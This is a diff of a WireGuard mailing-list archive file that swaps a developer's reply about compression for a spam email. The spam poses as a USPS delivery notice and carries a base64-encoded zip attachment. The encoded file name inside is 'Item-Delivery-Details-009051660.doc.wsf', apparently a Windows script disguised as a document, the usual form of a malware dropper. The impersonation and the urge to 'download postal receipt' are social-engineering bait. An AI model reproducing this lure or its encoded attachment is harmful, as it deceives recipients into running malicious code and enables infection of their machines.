@@ -1,31 +1,25 @@
-Return-Path: Jason@zx2c4.com
+Return-Path: jeffwoo3@server.jeffwoodsradio.com
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id bca27895
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 025007db
  for <wireguard@lists.zx2c4.com>;
- Sat, 31 Dec 2016 02:26:33 +0000 (UTC)
-Received: from frisell.zx2c4.com (frisell.zx2c4.com [192.95.5.64])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 31e22e1d
+ Sat, 31 Dec 2016 19:20:47 +0000 (UTC)
+Received: from server.jeffwoodsradio.com (server.jeffwoodsradio.com
+ [162.144.144.229])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id e550a716
  for <wireguard@lists.zx2c4.com>;
- Sat, 31 Dec 2016 02:26:33 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 2a05cad8
- for <wireguard@lists.zx2c4.com>;
- Sat, 31 Dec 2016 02:26:33 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTPSA id 86967558
- (TLSv1.2:ECDHE-RSA-AES128-GCM-SHA256:128:NO)
- for <wireguard@lists.zx2c4.com>;
- Sat, 31 Dec 2016 02:26:33 +0000 (UTC)
-Received: by mail-oi0-f53.google.com with SMTP id b126so438053390oia.2
- for <wireguard@lists.zx2c4.com>; Fri, 30 Dec 2016 18:34:57 -0800 (PST)
+ Sat, 31 Dec 2016 19:20:47 +0000 (UTC)
+Received: from jeffwoo3 by server.jeffwoodsradio.com with local (Exim 4.87)
+ (envelope-from <jeffwoo3@server.jeffwoodsradio.com>)
+ id 1cNPOW-0002kQ-Oa
+ for wireguard@lists.zx2c4.com; Sat, 31 Dec 2016 19:32:45 +0000
+To: wireguard@lists.zx2c4.com
+Subject: Notification status of your delivery (USPS 009051660)
+Date: Sat, 31 Dec 2016 12:32:44 -0700
 MIME-Version: 1.0
-In-Reply-To: <20161230060941.u4bwzdmforghluhz@pdebuildx-amd64.voodoowarez.com>
-References: <20161230060941.u4bwzdmforghluhz@pdebuildx-amd64.voodoowarez.com>
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Sat, 31 Dec 2016 03:34:56 +0100
-Message-ID: <CAHmME9ps=8bc74tnmKMnitH_wRBLXoioQc+XC_qvqk8Pv6WgBA@mail.gmail.com>
-Subject: Re: Compression support- zstd, &c
-To: rektide <rektide@voodoowarez.com>
-Content-Type: text/plain; charset=UTF-8
-Cc: WireGuard mailing list <wireguard@lists.zx2c4.com>
+Message-ID: <dbdb458dba2023815294a4ba0bcf4256@jeffwoodsradio.com>
+From: "USPS Station Management" <alan.weber@jeffwoodsradio.com>
+Content-Type: multipart/mixed; boundary="b1_14878895347515f9f7a845be6ef13023"
+Reply-To: USPS Station Management <alan.weber@jeffwoodsradio.com>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -35,41 +29,93 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-Hi Rektide,
+--b1_14878895347515f9f7a845be6ef13023
+Content-Type: text/plain; charset=us-ascii
 
-On Fri, Dec 30, 2016 at 7:09 AM, rektide <rektide@voodoowarez.com> wrote:
-> Greetings. Compression would be a great feature for WireGuard & it's road=
-map. Perhaps the latest high compression & high throughput, very tuneable Z=
-std from Cyan4793? I think it'd make a fine complement to the other very ni=
-ce modern technologies WireGuard has adopted.
-> http://facebook.github.io/zstd/
->
-> IPSec has a decent if not very modern history of compression with deflate=
-, lzs, and lzjh support via IP Compression packets. That shows that there's=
- some precedent for this feature. More recently OpenVPN has added LZ4 suppo=
-rt.
->
-> I want to throw on a feature request- compression. It'd be great to get f=
-ree compression across the tunnel. OpenVPN recently added LZ4 compression. =
-I personally would love to see Zstd supported. Seeing compression added to =
-your roadmap would be immensely satisfying for me,
-> I'd point to the author of both LZ4 and Zstd- Cyan4973-'s post introducin=
-g Zstd for more info the tradeoffs between these and others (Snappy, lzo, &=
-c), which boil down to CPU usage and compression ratio,
-> http://fastcompression.blogspot.com/2015/01/zstd-stronger-compression-alg=
-orithm.html
+Dear Customer,
 
-That's an interesting idea. The first concern that immediately comes
-to mind is data leakage and CRIME-like compression attacks. We'd have
-to tread very carefully in order to do this right. Is there a
-particular implementation strategy for this you have in mind?
-Historically adding compression to crypto protocols has been quite
-risky.
+USPS courier was unable to contact you for your parcel delivery.
 
-> This would make a huge difference for me while I am tethered to cellular.
+Download postal receipt attached to e-mail!
 
-Do you have any metrics on what kind of difference? I've never tried
-out the effects of compression on cellular links. Is it immediately
-noticeable in some obvious way?
+Yours respectfully,
+Alan Weber,
+USPS Senior Delivery Manager.
 
-Jason
+
+--b1_14878895347515f9f7a845be6ef13023
+Content-Type: application/zip; name="Item-Delivery-Details-009051660.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Item-Delivery-Details-009051660.zip
+
+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
+
+
+--b1_14878895347515f9f7a845be6ef13023--
